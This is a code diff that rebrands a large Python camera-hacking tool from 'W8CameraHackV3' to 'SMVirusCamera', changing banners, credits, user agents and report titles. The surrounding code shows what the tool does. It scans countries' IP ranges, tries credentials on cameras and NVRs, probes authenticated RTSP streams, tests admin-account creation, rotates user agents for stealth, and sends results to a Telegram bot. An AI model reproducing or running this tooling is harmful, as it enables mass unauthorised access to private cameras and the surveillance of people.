@@ -755,7 +755,7 @@ country_blacklist: set = set()   # set of 2-letter ISO codes
 SCAN_SUMMARY_FILE = os.path.join(SCRIPT_DIR, "scan_summary.log")
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ── W8 Feature Pack ───────────────────────────────────────────────────────────
+# ── SMV Feature Pack ───────────────────────────────────────────────────────────
 # ══════════════════════════════════════════════════════════════════════════════
 
 # ── Dependency Auto-Installer ─────────────────────────────────────────────────
@@ -841,7 +841,7 @@ _UA_LIST = [
     'Dalvik/2.1.0 (Linux; U; Android 13; SM-G998B Build/TP1A.220624.014)',
     'python-requests/2.31.0',
     'curl/8.6.0',
-    'W8Scanner/3.0 (+https://github.com/W8SOJIB)',
+    'SMVirusCamera/3.0 (+https://github.com/justcloneit)',
 ]
 _ua_idx  = 0
 _ua_lock = threading.Lock()
@@ -1209,7 +1209,7 @@ def load_stealth_config_from_telegram() -> None:
         pass
 
 # ══════════════════════════════════════════════════════════════════════════════
-# ── W8 Feature Pack II ────────────────────────────────────────────────────────
+# ── SMVirusCamera Feature Pack II ────────────────────────────────────────────────────────
 # ══════════════════════════════════════════════════════════════════════════════
 
 import random as _rnd
@@ -1301,7 +1301,7 @@ def get_date() -> str:
 
 def _start_ts_cache() -> None:
     threading.Thread(target=_ts_updater_loop, daemon=True,
-                     name='W8-ts-cache').start()
+                     name='SMV-ts-cache').start()
 
 # ── Memory Pressure Monitor ───────────────────────────────────────────────────
 _mem_monitor_running = False
@@ -1327,7 +1327,7 @@ def _mem_monitor_loop() -> None:
 
 def _start_mem_monitor() -> None:
     threading.Thread(target=_mem_monitor_loop, daemon=True,
-                     name='W8-mem-monitor').start()
+                     name='SMV-mem-monitor').start()
 
 # ── Random Cyber Facts ────────────────────────────────────────────────────────
 _CYBER_FACTS = [
@@ -2042,8 +2042,8 @@ def test_admin_creation(ip: str, port: int) -> bool:
     Returns True if any vulnerability is confirmed.
     """
     C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
-    _test_user = 'w8probe_test'
-    _test_pass = 'W8Pr0be!2024x'
+    _test_user = 'smvprobe_test'
+    _test_pass = 'SMVPr0be!2024x'
     sess = requests.Session()
     sess.verify = False
     hdrs = browser_headers()
@@ -2748,7 +2748,7 @@ def _build_telegram_session():
     s.mount("http://", adapter)
     s.headers.update({
         "Connection": "keep-alive",
-        "User-Agent": "W8CameraHack/3",
+        "User-Agent": "SMVCameraHack/3",
     })
     return s
 
@@ -3734,7 +3734,7 @@ def _telegram_cmd_worker() -> None:
                     try:
                         _csv_path = export_to_csv(file_path=None)
                         if _csv_path and os.path.exists(_csv_path):
-                            send_telegram_file_blocking(_csv_path, "📊 W8 Results CSV")
+                            send_telegram_file_blocking(_csv_path, "📊 SMV Results CSV")
                         else:
                             _telegram_cmd_reply(reply_token, from_chat, "❌ No data to export.")
                     except Exception as _csv_e:
@@ -3934,7 +3934,7 @@ def _telegram_cmd_worker() -> None:
                 elif cmd in ("/help", "/start",
                              f"/help@{bot_token.split(':')[0]}"):
                     help_text = (
-                        "🤖 <b>W8CameraHack Bot Commands</b>\n"
+                        "🤖 <b>SMVirusCamera Bot Commands</b>\n"
                         "━━━━━━━━━━━━━━━━━━━━━━\n"
                         "/status          — Live scan progress\n"
                         "                   mode · country · % · speed · ETA\n"
@@ -4963,7 +4963,7 @@ def find_working_rtsp_url(ip: str, username: str, password: str,
             s2.settimeout(timeout)
             s2.connect((ip2, port2))
             req2 = (f'DESCRIBE {_url2} RTSP/1.0\r\nCSeq: 3\r\n'
-                    f'{_dig_hdr}User-Agent: W8Scanner/3.0\r\n\r\n')
+                    f'{_dig_hdr}User-Agent: SMVScanner/3.0\r\n\r\n')
             s2.sendall(req2.encode())
             r2 = s2.recv(512).decode(errors='ignore')
             s2.close()
@@ -4979,7 +4979,7 @@ def find_working_rtsp_url(ip: str, username: str, password: str,
                 s.settimeout(timeout)
                 s.connect((ip, rtsp_port))
                 req = (f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 2\r\n'
-                       f'{auth_header}User-Agent: W8Scanner/3.0\r\n\r\n')
+                       f'{auth_header}User-Agent: SMVScanner/3.0\r\n\r\n')
                 s.sendall(req.encode())
                 resp = s.recv(512).decode(errors='ignore')
                 if 'RTSP/1.0 200' in resp:
@@ -5698,7 +5698,7 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
                                   ports: List[int], country_name: str = "Unknown", country_code: str = "XX") -> Optional[dict]:
     """
     Scan IP for camera detection (fast find) then try login
-    Similar to W8CameraHackV2.py logic
+    Similar to SMVirusCameraV2.py logic
     """
     global scanned_count, total_ips, cctv_output_file, current_country_name, _global_cameras_found
 
@@ -6873,7 +6873,7 @@ def scan_country_cameras(country: dict,
                          max_workers: int = None):
     """
     Scan country IP ranges for cameras (fast find then try login)
-    Similar to W8CameraHackV2.py but with login validation
+    Similar to SMVirusCameraV2.py but with login validation
     """
     global total_ips, scanned_count, valid_results, start_time, cctv_output_file
     global _current_range_idx, _last_scanned_ip_global
@@ -9209,11 +9209,11 @@ def print_feature_help():
     C = Fore.CYAN
 
     print(f"\n{C}{'═'*62}{W}")
-    print(f"{G}   W8CameraHackV3 — Feature Reference & Help{W}")
+    print(f"{G}   SMVirusCamera — Feature Reference & Help{W}")
     print(f"{C}{'═'*62}{W}")
 
     # ── CLI Flags ──────────────────────────────────────────────────────────────
-    print(f"\n{Y}  CLI FLAGS{W}   python3 W8CameraHackV3.py [flags]")
+    print(f"\n{Y}  CLI FLAGS{W}   python3 SMVirusCamera.py [flags]")
     print(f"{C}  {'─'*58}{W}")
     _flags = [
         ("--country CC",       "Start scan for country code directly (e.g. --country TR)"),
@@ -9467,21 +9467,21 @@ def get_country(ip):
 
 
 def print_banner():
-    """Display main banner - same style as W8CameraHackV2.py"""
+    """Display main banner - same style as SMVirusCameraV2.py"""
     banner = f"""
 ╔═══════════════════════════════════════╗
 ║   Camera Login Valid Checker v7.0     ║
-║   W8Team - IP Scanner & Collector     ║
-║   Credit: W8Team/W8SOJIB              ║
-║   250 Countries  | 5 RIR Regions     ║
+║   SMVirusC - IP Scanner & Collector   ║
+║   Credit: justcloneit/SMVirusCamera   ║
+║   250 Countries  | 5 RIR Regions      ║
 ╚═══════════════════════════════════════╝
 """
     print(f"{Fore.RED}{banner}{Style.RESET_ALL}")
     print(
-        f"{Fore.GREEN}[*] Developed by: {Fore.YELLOW}W8Team/W8SOJIB{Style.RESET_ALL}"
+        f"{Fore.GREEN}[*] Developed by: {Fore.YELLOW}SMVirusCamera{Style.RESET_ALL}"
     )
     print(
-        f"{Fore.GREEN}[*] GitHub: {Fore.YELLOW}github.com/W8SOJIB{Style.RESET_ALL}"
+        f"{Fore.GREEN}[*] GitHub: {Fore.YELLOW}justcloneit/SMVirusCamera{Style.RESET_ALL}"
     )
     print(f"{Fore.GREEN}[*] Termux Supported ✓{Style.RESET_ALL}")
     print(
@@ -10779,7 +10779,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                 _gpath = _gt.replace('{n}', str(_gn))
                 _gurl  = f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554{_gpath}"
                 _greq  = (f"DESCRIBE {_gurl} RTSP/1.0\r\nCSeq: 1\r\n"
-                          f"User-Agent: W8Scanner\r\n\r\n")
+                          f"User-Agent: SMVScanner\r\n\r\n")
                 for _retry in range(2):
                     try:
                         _gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -10967,7 +10967,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                 _zs.settimeout(1.0)
                 _zs.connect((nvr_ip, 554))
                 _zs.sendall((f"DESCRIBE {_zurl} RTSP/1.0\r\nCSeq: 1\r\n"
-                             f"User-Agent: W8Scanner\r\n\r\n").encode())
+                             f"User-Agent: SMVScanner\r\n\r\n").encode())
                 _zresp = _zs.recv(256).decode('utf-8', errors='replace')
                 _zs.close()
                 if ' 200 ' in _zresp or ' 401 ' in _zresp:
@@ -11004,7 +11004,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
             _verify_rtsp = next((c['rtsp'] for c in _channels if not c.get('zero_ch')),
                                 _channels[0]['rtsp'])
             _vreq = (f"DESCRIBE {_verify_rtsp} RTSP/1.0\r\nCSeq: 1\r\n"
-                     f"User-Agent: W8Scanner\r\n\r\n")
+                     f"User-Agent: SMVScanner\r\n\r\n")
             _vs.sendall(_vreq.encode())
             _vresp = _vs.recv(256).decode('utf-8', errors='replace')
             _vs.close()
@@ -11035,7 +11035,7 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                     _cts.settimeout(1.5)
                     _cts.connect((nvr_ip, 554))
                     _cts.sendall((f"DESCRIBE {_ch['rtsp']} RTSP/1.0\r\nCSeq: 1\r\n"
-                                  f"User-Agent: W8\r\n\r\n").encode())
+                                  f"User-Agent: SMV\r\n\r\n").encode())
                     _cr = _cts.recv(256).decode('utf-8', errors='replace')
                     _cts.close()
                     if ' 200 ' in _cr:
@@ -11406,7 +11406,7 @@ def sub_stream_finder(ip: str, rtsp_port: int, username: str, password: str,
                 s.connect((ip, rtsp_port))
                 req = (f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n'
                        f'Authorization: Basic {creds_b64}\r\n'
-                       f'User-Agent: W8Scanner\r\n\r\n')
+                       f'User-Agent: SMVScanner\r\n\r\n')
                 s.send(req.encode())
                 resp = s.recv(256).decode(errors='ignore')
                 if ' 200 ' in resp:
@@ -11974,7 +11974,7 @@ def _launch_auto_test(ip: str, port: int, username: str, password: str,
 def generate_m3u_from_all_results() -> Optional[str]:
     """Compile all found RTSP URLs from ValidCamera files into one M3U playlist."""
     G, Y, W, C = Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.CYAN
-    out_path = os.path.join(SCRIPT_DIR, 'W8_All_Cameras.m3u')
+    out_path = os.path.join(SCRIPT_DIR, 'SMV_All_Cameras.m3u')
     files = find_valid_camera_files()
     if not files:
         print(f"{Y}[!] No ValidCamera files found.{W}")
@@ -12119,7 +12119,7 @@ def _rtsp_probe_url(rtsp_url: str, timeout: float = 2.0) -> bool:
             _s.connect((ip, port))
             req = (f'DESCRIBE {probe_url} RTSP/1.0\r\nCSeq: 1\r\n'
                    f'Authorization: Basic {creds_b64}\r\n'
-                   f'User-Agent: W8Scanner/3.0\r\n\r\n')
+                   f'User-Agent: SMVScanner/3.0\r\n\r\n')
             _s.sendall(req.encode())
             resp = _s.recv(256).decode(errors='ignore')
             if 'RTSP/1.0 200' in resp:
@@ -12139,7 +12139,7 @@ def _rtsp_probe_url(rtsp_url: str, timeout: float = 2.0) -> bool:
                         _s2.settimeout(timeout)
                         _s2.connect((ip, port))
                         req2 = (f'DESCRIBE {probe_url} RTSP/1.0\r\nCSeq: 2\r\n'
-                                f'{_dh}User-Agent: W8Scanner/3.0\r\n\r\n')
+                                f'{_dh}User-Agent: SMVScanner/3.0\r\n\r\n')
                         _s2.sendall(req2.encode())
                         r2 = _s2.recv(256).decode(errors='ignore')
                         return 'RTSP/1.0 200' in r2
@@ -12152,7 +12152,7 @@ def _parse_rtsp_tested_blocks(filepath: str) -> list:
     """
     Parse any RTSP file into a list of entry dicts.
     Auto-detects format:
-      W8 block   — ====60= separators, 'RTSP URL:' key
+      SMV block   — ====60= separators, 'RTSP URL:' key
       NVR map    — ────── separators,  'RTSP:'     key  (RTSP_Results/)
       Plain list — one rtsp:// URL per line             (RTSP_Links/)
       JSON       — { "channels": [...] }               (RTSP_Results/*.json)
@@ -12196,7 +12196,7 @@ def _parse_rtsp_tested_blocks(filepath: str) -> list:
             pass
         return entries
 
-    # ── W8 block format (====60= separators) ──────────────────────────────────
+    # ── SMV block format (====60= separators) ──────────────────────────────────
     if ('=' * 30) in content and 'RTSP URL' in content:
         for block in content.split('=' * 60):
             if not block.strip():
@@ -12209,7 +12209,7 @@ def _parse_rtsp_tested_blocks(filepath: str) -> list:
                 k, v = line.split(':', 1)
                 e[k.strip()] = v.strip()
             if e.get('RTSP URL') and e['RTSP URL'].startswith('rtsp://'):
-                e['_fmt'] = 'w8block'
+                e['_fmt'] = 'SMVblock'
                 entries.append(e)
         return entries
 
@@ -12718,7 +12718,7 @@ def _rtsp_single_mode():
                 _s.connect((_m_ip, _m_port))
                 _req = (f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n'
                         f'Authorization: Basic {creds_b64}\r\n'
-                        f'User-Agent: W8Scanner/3.0\r\n\r\n')
+                        f'User-Agent: SMVScanner/3.0\r\n\r\n')
                 _s.sendall(_req.encode())
                 _resp = _s.recv(512).decode(errors='ignore')
                 if 'RTSP/1.0 200' in _resp:
@@ -12739,7 +12739,7 @@ def _rtsp_single_mode():
                                 _s2.settimeout(2.0)
                                 _s2.connect((_m_ip, _m_port))
                                 _req2 = (f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 2\r\n'
-                                         f'{_dh}User-Agent: W8Scanner/3.0\r\n\r\n')
+                                         f'{_dh}User-Agent: SMVScanner/3.0\r\n\r\n')
                                 _s2.sendall(_req2.encode())
                                 _r2 = _s2.recv(256).decode(errors='ignore')
                                 if 'RTSP/1.0 200' in _r2:
@@ -13280,7 +13280,7 @@ def _rtsp_view_mode():
 
     if not _all_entries:
         print(f"\n{Y}[!] No parseable RTSP entries found in selected file(s).{W}")
-        print(f"    Formats supported: W8 block, NVR Channel Map, plain URL list, JSON.")
+        print(f"    Formats supported: SMV block, NVR Channel Map, plain URL list, JSON.")
         return
 
     _live_list  = [e for e in _all_entries if e.get('Status', '').upper() == 'LIVE']
@@ -13682,7 +13682,7 @@ def export_to_csv(file_path: str = None) -> Optional[str]:
                 return None
 
     sources = files if file_path is None else [file_path]
-    out_path = os.path.join(SCRIPT_DIR, 'W8_Results.csv')
+    out_path = os.path.join(SCRIPT_DIR, 'SMV_Results.csv')
     rows = []
     for fp in sources:
         cc = extract_country_code_from_filename(os.path.basename(fp))
@@ -15281,7 +15281,7 @@ def main():
                                      f"  {_c['name']:<24}  ")
                 print(_row_str)
         print(f"\n{Fore.CYAN}{'═'*72}{Style.RESET_ALL}")
-        print(f"  Usage: python3 W8CameraHackV3.py --country TR")
+        print(f"  Usage: python3 SMVirusCamera.py --country TR")
         print(f"{Fore.CYAN}{'═'*72}{Style.RESET_ALL}\n")
         sys.exit(0)
 
@@ -15364,7 +15364,7 @@ def main():
         print(f"\n  {G}Recommended flags:{W}")
         print(f"    --threads {_bm_thr}  --timeout {_bm_tmo_rec}")
         print(f"\n  {C}Full command example:{W}")
-        print(f"    python3 W8CameraHackV3.py --country TR "
+        print(f"    python3 SMVirusCamera.py --country TR "
               f"--threads {_bm_thr} --timeout {_bm_tmo_rec}")
         print(f"{C}{'═'*62}{W}\n")
         sys.exit(0)
@@ -15523,7 +15523,7 @@ def main():
         # ── Build plain-text report ─────────────────────────────────────────────
         _dr_lines = []
         _dr_lines.append('═' * 78)
-        _dr_lines.append('  W8CameraHackV3 — Daily Scan Report')
+        _dr_lines.append('  SMVirusCamera — Daily Scan Report')
         _dr_lines.append(f'  Generated : {_dr_now_str}')
         _dr_lines.append(f'  Window    : last 24 hours  (since {_dr_win_str})')
         _dr_lines.append('═' * 78)
@@ -15563,7 +15563,7 @@ def main():
             _dr_lines.append('  No per-day credential data yet. Run scans to populate.')
         _dr_lines.append('')
         _dr_lines.append('═' * 78)
-        _dr_lines.append(f'  Generated by W8CameraHackV3  |  {_dr_now_str}')
+        _dr_lines.append(f'  Generated by SMVirusCamera  |  {_dr_now_str}')
         _dr_lines.append('═' * 78)
         _dr_text = '\n'.join(_dr_lines)
 
@@ -15585,7 +15585,7 @@ def main():
                 for i, (_dk, _dv) in enumerate(_dr_top_cred, 1)
             )
             _dr_write = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
-<title>W8CameraHackV3 Daily Report</title><style>
+<title>SMVirusCamera Daily Report</title><style>
 body{{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:24px}}
 h1{{color:#58a6ff}}h2{{color:#79c0ff;border-bottom:1px solid #30363d;padding-bottom:6px}}
 table{{border-collapse:collapse;width:100%;margin-bottom:24px}}
@@ -15594,7 +15594,7 @@ td{{padding:6px 12px;border-bottom:1px solid #21262d}}tr:hover{{background:#161b
 .stat{{display:inline-block;background:#21262d;border-radius:8px;padding:12px 20px;margin:8px;min-width:130px;text-align:center}}
 .sv{{font-size:2em;color:#58a6ff;font-weight:bold}}.sl{{color:#8b949e;font-size:.85em}}
 footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
-<h1>W8CameraHackV3 — Daily Scan Report</h1>
+<h1>SMVirusCamera — Daily Scan Report</h1>
 <p style="color:#8b949e">Generated: {_dr_now_str} &nbsp;|&nbsp; Window: last 24 h (since {_dr_win_str})</p>
 <h2>Overview</h2>
 <div class="stat"><div class="sv">{len(_dr_scans)}</div><div class="sl">Countries</div></div>
@@ -15607,7 +15607,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
 <h2>Top Credentials (past 24 h)</h2>
 <table><thead><tr><th>#</th><th>Username</th><th>Password</th><th>Hits</th><th>Bar</th></tr></thead>
 <tbody>{_dr_cred_rows}</tbody></table>
-<footer>Generated by W8CameraHackV3 &mdash; {_dr_now_str}</footer></body></html>"""
+<footer>Generated by SMVirusCamera &mdash; {_dr_now_str}</footer></body></html>"""
         else:
             _dr_write = _dr_text
 
@@ -15631,7 +15631,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
 
         # ── Optional Telegram delivery ──────────────────────────────────────────
         if TELEGRAM_CONFIG.get("enabled"):
-            _tg_rpt = (f"📊 <b>W8CameraHackV3 — 24h Report</b>\n"
+            _tg_rpt = (f"📊 <b>SMVirusCamera — 24h Report</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌍 Countries scanned : {len(_dr_scans)}\n"
                        f"📷 Cameras found     : {_dr_tot_cam:,}\n"
@@ -17496,7 +17496,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             ]
         _cr_html_parts.append(_cr_table_section)
         _cr_html_parts.append(
-            f'<footer>Generated by W8CameraHackV3 &mdash; {_cr_now_str} &nbsp;|&nbsp; '
+            f'<footer>Generated by SMVirusCamera &mdash; {_cr_now_str} &nbsp;|&nbsp; '
             f'Source: {os.path.basename(_cr_src)}</footer></body></html>'
         )
         _cr_html = '\n'.join(_cr_html_parts)
@@ -17701,7 +17701,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                 f'<tbody>{cc_rows}</tbody></table>',
                 brand_sec,
                 table_sec,
-                f'<footer>Generated by W8CameraHackV3 &mdash; {now_str} &nbsp;|&nbsp; '
+                f'<footer>Generated by SMVirusCamera &mdash; {now_str} &nbsp;|&nbsp; '
                 f'Source: {_esc(src_name)}</footer></body></html>',
             ]
             return '\n'.join(parts), rp, len(uips), len(ccs), len(pairs)
@@ -17858,7 +17858,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             '<th>Countries</th><th>Cred Pairs</th><th>Top Credential</th>',
             f'</tr></thead><tbody>{_crb_idx_body}</tbody></table>',
             _crb_top5_sec,
-            f'<footer>Generated by W8CameraHackV3 &mdash; {_crb_now_str}'
+            f'<footer>Generated by SMVirusCamera &mdash; {_crb_now_str}'
             f' &nbsp;|&nbsp; {_crb_written} reports &nbsp;|&nbsp; {_crb_grand_total:,} cameras</footer>',
             '</body></html>',
         ])
@@ -18681,7 +18681,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             for _hnt_ip, _hnt_ports in list(_fca_open.items())[:5]:
                 _hnt_port = _hnt_ports[0]
                 _fca_hints.append(
-                    f"  python W8CameraHackV3.py --onvif-probe {_hnt_ip}:{_hnt_port}"
+                    f"  python SMVirusCamera.py --onvif-probe {_hnt_ip}:{_hnt_port}"
                     f" --user admin --pass admin")
             if _fca_hints:
                 print(f"  {M}Suggested next steps:{W}")
@@ -18832,7 +18832,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                     s.connect((_cdc_ip, _cdc_rtsp_port))
                     _rurl = (f'rtsp://{_cdc_ip}:{_cdc_rtsp_port}{_rpath}')
                     _req  = (f'DESCRIBE {_rurl} RTSP/1.0\r\n'
-                             f'CSeq: 1\r\nUser-Agent: W8Scanner/3.0\r\n'
+                             f'CSeq: 1\r\nUser-Agent: SMVScanner/3.0\r\n'
                              f'Authorization: Basic {_cred_b64}\r\n'
                              f'Accept: application/sdp\r\n\r\n')
                     s.sendall(_req.encode())
@@ -18902,7 +18902,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                 _hp_arg    = _hp if _hp else '""'
                 print(f"\n    {M}VLC:    rtsp://{_cred_str}@{_cdc_ip}:"
                       f"{_cdc_rtsp_port}/Streaming/Channels/101{W}")
-                print(f"    {M}Probe:  python W8CameraHackV3.py --onvif-probe "
+                print(f"    {M}Probe:  python SMVirusCamera.py --onvif-probe "
                       f"{_cdc_ip}:{_cdc_port} --user {_hu} --pass {_hp_arg}{W}")
             # ── Write output if requested ──────────────────────────────────────
             if _cdc_out_path:
@@ -19053,7 +19053,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                     s.connect((ip, rtsp_port))
                     _rurl = f'rtsp://{ip}:{rtsp_port}{_rpath}'
                     _req  = (f'DESCRIBE {_rurl} RTSP/1.0\r\n'
-                             f'CSeq: 1\r\nUser-Agent: W8Scanner/3.0\r\n'
+                             f'CSeq: 1\r\nUser-Agent: SMVScanner/3.0\r\n'
                              f'Authorization: Basic {_cred_b64}\r\n'
                              f'Accept: application/sdp\r\n\r\n')
                     s.sendall(_req.encode())
@@ -20790,7 +20790,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             f'<h1>&#x1F4E1; Scan Range — {_srh_cidr}</h1>'
             f'<div class="sub">Generated '
             f'{_dt_srh.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
-            f' &nbsp;|&nbsp; W8CameraHackV3</div>'
+            f' &nbsp;|&nbsp; SMVirusCamera</div>'
             '<div class="stats">'
             f'<div class="s"><div class="n" style="color:#3fb950">'
             f'{len(_srh_ips):,}</div>'
@@ -20812,7 +20812,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             '</tr></thead><tbody>'
             + _srh_rows + _no_data +
             '</tbody></table>'
-            f'<div class="foot">W8CameraHackV3 · {_srh_cidr}'
+            f'<div class="foot">SMVirusCamera · {_srh_cidr}'
             f' · {len(_srh_cameras)} cameras · {_srh_ts}</div>'
             '<script>'
             'let sd={};'
@@ -20885,7 +20885,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             cred = f"{user}:{pw}@" if user else ''
             url  = f"rtsp://{cred}{ip}:{port}{path}"
             req  = (f"DESCRIBE {url} RTSP/1.0\r\n"
-                    f"CSeq: 1\r\nUser-Agent: W8Scanner/3.0\r\n"
+                    f"CSeq: 1\r\nUser-Agent: SMVScanner/3.0\r\n"
                     f"Accept: application/sdp\r\n\r\n")
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -21360,7 +21360,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             _cred = f"{_rep_user}:{_rep_pass}@" if _rep_user else ''
             _rtsp_url = f"rtsp://{_cred}{_rep_ip}:{_rep_rtsp_port}{_path}"
             _req = (f"DESCRIBE {_rtsp_url} RTSP/1.0\r\nCSeq: 1\r\n"
-                    f"User-Agent: W8Scanner\r\n\r\n")
+                    f"User-Agent: SMVScanner\r\n\r\n")
             try:
                 _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 _s.settimeout(2.0)
@@ -21551,7 +21551,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             cred = f"{usr}:{pw}@" if usr else ''
             url  = f"rtsp://{cred}{ip}:{rport}{path}"
             req  = (f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n"
-                    f"User-Agent: W8Scanner\r\n\r\n")
+                    f"User-Agent: SMVScanner\r\n\r\n")
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(2.0); s.connect((ip, rport))
@@ -21662,7 +21662,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                 f'<table>{_r_rows}</table>{_vlc}</div>'
                 f'<div class="sec"><div class="sh"><span class="n">5</span> Snapshot</div>'
                 f'<table>{_sn_row}</table>{_sn_sec}</div>'
-                f'<div class="foot">W8CameraHackV3 &middot; {ip}:{port}'
+                f'<div class="foot">SMVirusCamera &middot; {ip}:{port}'
                 f' &middot; {cts}</div>'
                 f'<script>{_br_CPJS}</script>'
                 '</body></html>')
@@ -21777,7 +21777,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             f'<div class="sub">Source: <strong style="color:#79c0ff">'
             f'{os.path.basename(_br_file)}</strong>'
             f' &nbsp;|&nbsp; {_dt_br.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
-            f' &nbsp;|&nbsp; W8CameraHackV3</div>'
+            f' &nbsp;|&nbsp; SMVirusCamera</div>'
             '<div class="stats">'
             f'<div class="s"><div class="n" style="color:#58a6ff">{len(_br_results)}</div>'
             f'<div class="l">Cameras</div></div>'
@@ -21800,7 +21800,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             '</tr></thead><tbody>'
             + _br_idx_rows + _no_row +
             '</tbody></table>'
-            f'<div class="foot">W8CameraHackV3 &middot; {len(_br_results)} cameras'
+            f'<div class="foot">SMVirusCamera &middot; {len(_br_results)} cameras'
             f' &middot; {_br_ts}</div>'
             '<script>'
             'let sd={};'
@@ -21982,7 +21982,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             cred = f"{usr}:{pw}@" if usr else ''
             url  = f"rtsp://{cred}{ip}:{rport}{path}"
             req  = (f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n"
-                    f"User-Agent: W8Scanner\r\n\r\n")
+                    f"User-Agent: SMVScanner\r\n\r\n")
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(2.0); s.connect((ip, rport))
@@ -22100,7 +22100,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                 f'<div class="sec"><div class="sh"><span class="n">5</span>'
                 f' Snapshot</div>'
                 f'<table>{_sn_row}</table>{_sn_sec}</div>'
-                f'<div class="foot">W8CameraHackV3 &middot; {ip}:{port}'
+                f'<div class="foot">SMVirusCamera &middot; {ip}:{port}'
                 f' &middot; {cts}</div>'
                 f'<script>{_ar_CPJS}</script>'
                 '</body></html>')
@@ -22214,7 +22214,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             f'<div class="sub">Source: <strong style="color:#79c0ff">'
             f'{os.path.basename(_ar_file)}</strong>'
             f' &nbsp;|&nbsp; {_dt_ar.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
-            ' &nbsp;|&nbsp; W8CameraHackV3</div>'
+            ' &nbsp;|&nbsp; SMVirusCamera</div>'
             '<div class="stats">'
             f'<div class="s"><div class="n" style="color:#58a6ff">{len(_ar_results)}</div>'
             '<div class="l">Cameras</div></div>'
@@ -22238,7 +22238,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                '<tr><td colspan="9" style="text-align:center;padding:28px;'
                'color:#8b949e">No cameras.</td></tr>') +
             '</tbody></table>'
-            f'<div class="foot">W8CameraHackV3 &middot; {len(_ar_results)} cameras'
+            f'<div class="foot">SMVirusCamera &middot; {len(_ar_results)} cameras'
             f' &middot; {_ar_ts}</div>'
             '<script>'
             'let sd={};'
@@ -22354,7 +22354,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             _cred = f"{_rh_user}:{_rh_pass}@" if _rh_user else ''
             _u = f"rtsp://{_cred}{_rh_ip}:{_rh_rtsp_port}{path}"
             _rq = (f"DESCRIBE {_u} RTSP/1.0\r\nCSeq: 1\r\n"
-                   f"User-Agent: W8Scanner\r\n\r\n")
+                   f"User-Agent: SMVScanner\r\n\r\n")
             try:
                 _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 _s.settimeout(2.0); _s.connect((_rh_ip, _rh_rtsp_port))
@@ -22480,7 +22480,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             '<div class="sec"><div class="sh">'
             '<span class="n">5</span> JPEG Snapshot</div>'
             f'<table>{_rh_snap_row}</table>{_rh_snap_sec}</div>'
-            f'<div class="foot">W8CameraHackV3 &middot; {_rh_ip}:{_rh_port}'
+            f'<div class="foot">SMVirusCamera &middot; {_rh_ip}:{_rh_port}'
             f' &middot; {_rh_ts}</div>'
             '<script>'
             'function cp(b,t){'
@@ -22875,7 +22875,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                     f"http://{_fp_ip}:{_fp_port}{path}",
                     timeout=timeout, verify=False,
                     allow_redirects=False,
-                    headers={'User-Agent': 'Mozilla/5.0 (W8Scanner)'})
+                    headers={'User-Agent': 'Mozilla/5.0 (SMVScanner)'})
             except Exception:
                 return None
 
@@ -22991,7 +22991,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
